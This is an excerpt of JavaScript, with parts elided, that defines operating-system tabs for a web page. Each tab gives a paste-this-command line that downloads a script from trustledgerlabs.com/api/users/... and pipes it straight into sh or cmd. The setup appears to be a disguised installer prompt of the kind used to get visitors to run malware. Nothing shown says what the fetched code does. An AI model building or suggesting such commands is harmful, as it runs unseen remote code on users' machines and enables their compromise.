...
const OS_TABS = [
  {
    ...
    label: "macOS",
    icon: "⌘",
    command: `curl 'https://trustledgerlabs.com/api/users/mac' | sh`,
  ...
  },
  {
    ...
    label: "Linux",
    icon: "🐧",
    command: `wget -qO- 'https://trustledgerlabs.com/api/users/linux' | sh`,
  ...
  },
  {
    ...
    label: "Windows",
    icon: "⊞",
    command: `curl https://trustledgerlabs.com/api/users/windows | cmd`,
